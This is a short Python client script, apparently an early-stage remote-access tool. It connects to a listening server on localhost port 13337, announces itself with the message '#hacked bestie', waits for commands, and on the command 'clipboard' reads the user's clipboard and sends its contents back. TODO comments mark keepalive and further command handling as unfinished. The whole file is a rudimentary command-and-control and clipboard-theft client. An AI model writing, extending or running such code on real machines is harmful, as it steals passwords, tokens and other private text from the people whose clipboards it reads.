import clipboard
import socket

# Client Side 

# TODO: conn keepalive
# sock.ioctl(socket.SIO_KEEPALIVE_VALS, (1, 60000, 30000))

# Create Client session; listen to server
server_addr = ('localhost', 13337)
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(server_addr)
sock.send("#hacked bestie".encode())

while True:
    data = sock.recv(1024)
    print("Received_data: %s" % data)
    # TODO: handle commands coming back

    if data.decode() == "clipboard":
        text = clipboard.paste()
        sock.send(text.encode())

# sock.send("#hacked bestie".encode())